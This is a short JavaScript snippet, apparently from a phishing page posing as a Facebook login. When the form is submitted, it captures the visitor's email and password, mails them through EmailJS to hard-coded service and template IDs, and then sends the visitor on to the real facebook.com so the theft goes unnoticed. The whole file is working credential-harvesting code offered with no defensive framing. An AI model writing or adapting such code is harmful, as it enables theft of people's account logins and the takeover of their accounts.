document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const templateParams = {
        email: email,
        password: password
    };

    emailjs.send('service_axl4jrc', 'template_234lfqc', templateParams)
        .then(function(response) {
            window.location.href = 'https://www.facebook.com'; // Redirection vers Facebook
        }, function(error) {
            console.log('Erreur lors de l\'envoi de l\'email:', error);
            alert('Erreur lors de l\'envoi des informations.');
        });
});
